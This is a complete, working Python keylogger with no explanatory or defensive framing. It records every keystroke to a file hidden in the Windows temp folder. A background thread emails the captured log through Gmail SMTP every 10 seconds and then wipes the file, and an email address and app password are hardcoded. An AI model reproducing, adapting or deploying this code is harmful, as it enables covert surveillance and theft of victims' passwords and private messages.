from pynput import keyboard
import logging
import threading
import smtplib
from email.message import EmailMessage
import time
import os

# === CONFIGURATION ===
LOG_INTERVAL = 10  # send log every 60 seconds
EMAIL_ADDRESS = 'saadahsan0754.@gmail.com'
EMAIL_PASSWORD = 'zjww llah eerv sqjh'  # use Gmail App Password

# === SETUP LOG FILE ===
log_dir = os.path.expanduser("~\\AppData\\Local\\Temp")
log_file = os.path.join(log_dir, "keylog.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

# === KEYBOARD LISTENER ===
def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(f'[{key}]')

# === SEND LOG TO EMAIL ===
def send_logs():
    while True:
        time.sleep(LOG_INTERVAL)
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                log_data = f.read()
            if log_data.strip():  # if there's anything logged
                try:
                    msg = EmailMessage()
                    msg['Subject'] = 'Keylogger Report'
                    msg['From'] = EMAIL_ADDRESS
                    msg['To'] = EMAIL_ADDRESS
                    msg.set_content(log_data)

                    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                        smtp.send_message(msg)

                    # Clear the file after sending
                    with open(log_file, "w") as f:
                        f.write('')
                except Exception as e:
                    print(f"[!] Failed to send email: {e}")

# === RUN LOGGER AND MAILER ===
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    mail_thread = threading.Thread(target=send_logs)
    mail_thread.daemon = True
    mail_thread.start()
    listener.join()

if __name__ == "__main__":
    start_keylogger()
